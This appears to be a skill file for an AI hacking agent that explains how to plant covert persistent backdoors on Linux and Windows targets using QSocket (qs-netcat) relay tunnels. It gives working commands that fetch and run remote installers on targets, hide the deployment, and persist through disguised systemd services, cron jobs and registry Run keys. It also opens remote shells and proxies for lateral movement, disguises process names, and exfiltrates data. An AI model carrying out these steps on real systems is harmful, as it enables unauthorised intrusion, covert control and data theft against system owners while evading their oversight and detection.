# QSocket Covert Persistence Skill

## Overview
Deploy, manage, and maintain persistent covert access to targets using QSocket (qs-netcat) encrypted tunnels through the QSRN relay network. No open ports required - both sides connect outbound.

## Prerequisites
- `qs-netcat` binary (install: `curl -fsSL qsocket.io/0 | bash`)
- SSH or shell access to target for initial deployment
- Shared secret (generate: `qs-netcat -g`)

## Deployment Workflow

### 1. Generate Secret
```bash
SECRET=$(qs-netcat -g)
echo "Save this: $SECRET"
```

### 2. Deploy to Linux Target
**One-liner (installs + persists automatically):**
```bash
ssh user@target "S='${SECRET}' curl -fsSL qsocket.io/0 | bash"
```

**Hidden deploy (no terminal output):**
```bash
ssh user@target "HIDE=1 S='${SECRET}' bash -c \"\$(curl -fsSL qsocket.io/0)\""
```

**Manual persistence via systemd (root):**
```bash
ssh user@target "cat > /tmp/qs.service << 'EOF'
[Unit]
Description=System Socket Service
After=network-online.target
[Service]
Type=simple
Restart=always
RestartSec=10
Environment=QS_ARGS=-s ${SECRET} -l -i -q
ExecStart=/usr/local/bin/qs-netcat
[Install]
WantedBy=multi-user.target
EOF
sudo mv /tmp/qs.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now qs.service"
```

**Cron persistence (non-root):**
```bash
ssh user@target "(crontab -l; echo '*/5 * * * * pgrep qs-netcat || QS_ARGS=\"-s ${SECRET} -l -i -q\" qs-netcat &') | crontab -"
```

### 3. Deploy to Windows Target
```powershell
$env:S="${SECRET}"; irm qsocket.io/1 | iex
# Persist via Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysSocket" /t REG_SZ /d "C:\Users\Public\qs-netcat.exe -s ${SECRET} -l -i -q" /f
```

### 4. Connect to Target
```bash
# Interactive shell
qs-netcat -i -s "${SECRET}"

# Port forward SSH
qs-netcat -f :2222 -s "${SECRET}"
ssh -p 2222 root@127.0.0.1

# SOCKS proxy through target
ssh -D 9090 -o ProxyCommand="qs-netcat -s ${SECRET}" root@qsocket
```

### 5. Verify Persistence
```bash
# From operator side - attempt connection
timeout 10 qs-netcat -i -s "${SECRET}" -c "echo ALIVE; uname -a; whoami"
```

## OPSEC
- Use `exec -a rsyslogd qs-netcat` to disguise process name
- Use `QS_ARGS` env var instead of `-s` on cmdline (no cmdline trace)
- Use `-q` flag for quiet mode
- Use `-T` flag to route through TOR
- All traffic E2E encrypted via SRP + 256-bit ephemeral keys
- QSRN relay never sees plaintext

## Integration with Other Tools
- **Port forward to deploy AnyDesk/VNC** through qsocket tunnel
- **Proxy lateral movement tools** (nxc, atexec) through qsocket SOCKS
- **Exfiltrate data** via qsocket pipe: `cat data | qs-netcat -s SECRET`

## Memory
After deploying, store the secret and target info in CyberStrike memory:
```
store_memory: qsocket_{hostname} = "secret: {SECRET}, deployed: {date}, user: {user}"
```
